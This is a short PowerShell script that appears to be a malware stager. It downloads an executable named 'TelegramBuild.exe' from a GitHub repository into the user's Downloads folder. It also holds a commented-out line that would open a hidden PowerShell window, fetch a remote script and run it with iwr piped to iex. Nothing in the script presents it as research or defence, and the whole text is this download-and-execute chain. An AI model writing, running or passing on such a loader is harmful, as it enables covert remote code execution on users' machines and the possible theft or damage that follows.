$Source = "https://github.com/waed69/n/raw/main/TelegramBuild.exe"  
$Destination = "C:\Users\$env:USERNAME\Downloads\TelegramBuild.exe"

Invoke-WebRequest -Uri $Source -OutFile $Destination


#run the next script
#Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr https://raw.githubusercontent.com/waed69/Brabus/main/sleep.ps1 | iex`""
